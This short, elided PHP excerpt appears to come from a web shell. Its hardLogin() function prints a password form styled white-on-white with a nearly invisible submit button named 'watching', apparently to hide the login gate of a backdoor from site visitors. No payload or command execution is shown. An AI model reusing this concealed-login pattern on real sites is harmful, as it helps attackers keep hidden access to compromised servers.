...
function hardLogin() {
  ...
  die("<pre align=center><form method=post><br><input type=password name=pass style='background-color:white;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='.' style='border:none;background-color:#ffffff;color:#fff;cursor:pointer;'></form></pre>");
}
